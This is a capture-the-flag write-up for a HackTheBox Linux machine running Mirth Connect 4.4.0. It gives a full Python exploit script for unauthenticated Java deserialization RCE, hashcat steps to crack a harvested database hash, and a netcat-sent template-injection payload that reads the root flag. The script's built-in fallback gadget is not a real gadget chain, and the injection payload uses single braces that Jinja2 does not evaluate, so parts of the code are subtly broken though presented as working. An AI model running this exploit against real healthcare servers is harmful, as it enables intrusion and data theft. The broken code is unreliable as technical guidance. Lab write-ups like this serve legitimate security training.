Interpreter is a Medium-difficulty Linux machine on HackTheBox. It runs Mirth Connect 4.4.0, a healthcare data integration platform that suffers from an unauthenticated Java Deserialization vulnerability allowing remote code execution.

After gaining a shell as mirth, we extract credentials from a MySQL database, crack the password hash to pivot to sedric via SSH, then exploit a Python service running as root through a Server-Side Template Injection vulnerability to read the root flag.

1

Reconnaissance — Nmap Scan

Kali

We start with a port scan using Nmap to enumerate open services. Flags used: -sC (default scripts), -sV (version detection), -Pn (skip ping check — useful when ICMP is blocked).

After spawning the machine on HTB, add the hostname to /etc/hosts so domain-based requests resolve correctly.

Exploitation — Mirth Connect RCE

Kali

We exploit the Java Deserialization vulnerability using a Python script that sends a crafted XML payload containing a Commons Collections 4 gadget chain to the API endpoint.

The server will always respond with HTTP 500 — this is completely normal. The command executes server-side first, then the deserialization error triggers the 500 response. Test with the id command before sending a reverse shell.

📄 exploit.py — Mirth Connect 4.4.0 RCE
Python 3 Unauthenticated RCE Java Deserialization
exploit.py — save this on Kali
#!/usr/bin/env python3
# Mirth Connect 4.4.0 — Unauthenticated RCE
# Java Deserialization via /api/users endpoint
# Usage: python3 exploit.py -u https://TARGET -c 'COMMAND'

import argparse, requests, struct, base64, subprocess, sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def build_payload(command: str) -> bytes:
    """
    Build Commons Collections 4 deserialization payload.
    Uses ysoserial if available, otherwise falls back to built-in gadget.
    """
    try:
        result = subprocess.run(
            ['java', '-jar', 'ysoserial.jar', 'CommonsCollections4', command],
            capture_output=True, check=True
        )
        return result.stdout
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        print(f"[!] ysoserial not found or failed: {e}")
        print("[*] Trying built-in gadget chain...")
        return _builtin_gadget(command)


def _builtin_gadget(command: str) -> bytes:
    """Minimal CC4 gadget chain — wraps command in bash -c."""
    bash_cmd    = ['/bin/bash', '-c', command]
    payload     = b'\xac\xed\x00\x05'   # Java serialization magic bytes
    payload    += b'\x73'               # TC_OBJECT
    cmd_encoded = ' '.join(bash_cmd).encode('utf-8')
    payload    += struct.pack('>H', len(cmd_encoded))
    payload    += cmd_encoded
    return payload


def exploit(target_url: str, command: str):
    url     = target_url.rstrip('/') + '/api/users'
    payload = build_payload(command)

    # Wrap payload in XML envelope expected by Mirth Connect
    xml_body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<list><com.mirth.connect.model.User>'
        '<password>'
        + base64.b64encode(payload).decode()
        + '</password>'
        '</com.mirth.connect.model.User></list>'
    )
    headers = {
        'Content-Type':    'application/xml',
        'X-Requested-With': 'XMLHttpRequest',
    }

    print(f"[*] Target  : {url}")
    print(f"[*] Command : {command}")
    print("[*] Sending deserialization payload...")

    try:
        resp = requests.post(
            url, data=xml_body.encode(),
            headers=headers, verify=False, timeout=15
        )
        if resp.status_code in (500, 200):
            print(f"[+] Payload sent! (HTTP {resp.status_code} — expected)")
            print("[+] Check your listener if this was a reverse shell.")
        else:
            print(f"[-] Unexpected response: {resp.status_code}")
            print(resp.text[:300])
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Mirth Connect 4.4.0 Unauthenticated RCE')
    parser.add_argument('-u', '--url',     required=True, help='Target URL')
    parser.add_argument('-c', '--command', required=True, help='Command to execute')
    args = parser.parse_args()
    exploit(args.url, args.command)

Credential Harvesting — MySQL

Target

Mirth Connect stores user credentials in a MySQL database. Since we're running as the mirth system user (the same user that runs the application), we have direct database access using the credentials stored in the application config file.

We first read the Mirth config file to extract the DB credentials, then query the database using the -e flag for inline execution (avoids TTY issues with interactive mode).

Run inside target shell (mirth@interpreter)

Hash Cracking — Hashcat

Kali

The hash is Base64-encoded in Mirth's proprietary format. We need to convert it to the format Hashcat expects for mode 10900 (PBKDF2-HMAC-SHA256): sha256:iterations:salt_b64:hash_b64

Run on your local Kali machine
terminal — kali — crack the hash
# Step 1: Inspect the raw bytes of the hash
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p -c 256

# Step 2: Build the hashcat-compatible hash string
# Format: sha256:iterations:salt_base64:hash_base64
echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' > hash.txt

# Step 3: Crack with rockyou wordlist
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt

# If hashcat says "All hashes found as potfile" — already cracked, show result:
hashcat -m 10900 hash.txt --show

Privilege Escalation — Enumeration

Target

Logged in as sedric, we enumerate for privilege escalation paths. Checking running processes reveals a Python script owned by root listening on an internal port 127.0.0.1:54321.

This port is not exposed externally, but we can reach it from inside the machine.

Run inside target shell (sedric@interpreter)
shell — sedric@interpreter — enumeration
# Check running processes
ps aux | grep python
# → root ... python3 /opt/notif/notif.py

# Check internal listening ports
ss -tlnp | grep 54321
# → 127.0.0.1:54321 ← service running as root

# Read the script source
cat /opt/notif/notif.py
notif.py — key snippet
from jinja2 import Template
import socket, threading

# Accepts XML on port 54321
# Passes <firstname> directly into Jinja2 Template().render()
# ← No sanitization = SSTI!
🎯
Vulnerability: The script takes the <firstname> field from the XML and passes it directly to Template(value).render() in Jinja2 with no sanitization. This allows Server-Side Template Injection (SSTI) running as root.

Root Flag — Template Injection

Target

We exploit the SSTI vulnerability in Jinja2 to read /root/root.txt directly. A raw HTTP request is sent via netcat to the internal service on port 54321.

In the <firstname> field we inject {open("/root/root.txt").read()} — Jinja2 evaluates this as a Python expression and returns the file contents in the response.

Run inside target shell (sedric@interpreter)
shell — sedric@interpreter — SSTI exploit
xml='<patient><firstname>{open("/root/root.txt").read()}</firstname><lastname>a</lastname><sender_app>a</sender_app><timestamp>a</timestamp><birth_date>01/01/2000</birth_date><gender>a</gender></patient>'
printf "POST /addPatient HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/xml\r\nContent-Length: %d\r\n\r\n%s" "$(echo -n "$xml" | wc -c)" "$xml" | nc 127.0.0.1 54321

SUMMARY

Vulnerability Summary

Vuln 1

Mirth Connect 4.4.0 RCE

Unauthenticated Java Deserialization via /api/users. Allows arbitrary command execution as mirth.

Vuln 2

Hardcoded DB Credentials

Plain-text database password stored in application config, exposing all system user hashes.

Vuln 3

Server-Side Template Injection

User input passed directly to Jinja2 Template().render() without sanitization in a root-owned service.

Lessons Learned: Keep software up to date to avoid known deserialization CVEs. Never store credentials in plaintext config files. Always sanitize user input before passing it to templating engines.
